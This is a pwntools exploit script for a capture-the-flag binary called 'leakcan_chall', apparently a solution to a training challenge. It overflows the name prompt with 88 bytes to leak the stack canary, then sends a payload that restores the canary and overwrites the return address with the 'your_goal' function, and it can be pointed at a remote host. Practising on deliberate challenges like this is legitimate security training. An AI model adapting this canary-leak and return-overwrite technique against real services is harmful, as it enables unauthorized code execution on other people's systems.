#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.39.so")

exe = "./leakcan_chall"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

sla(b'name?', b'A' * 88)
recvunt(b'A' * 88 + b"\n")
canary = u64(io.recv(7).ljust(8, b'\x00')) << 8

log.info(hex(canary))

payload = flat(
    b'A' * 88,
    canary,
    b'A' * 8,
    elf.sym.your_goal
    )
sl(payload)

io.interactive()

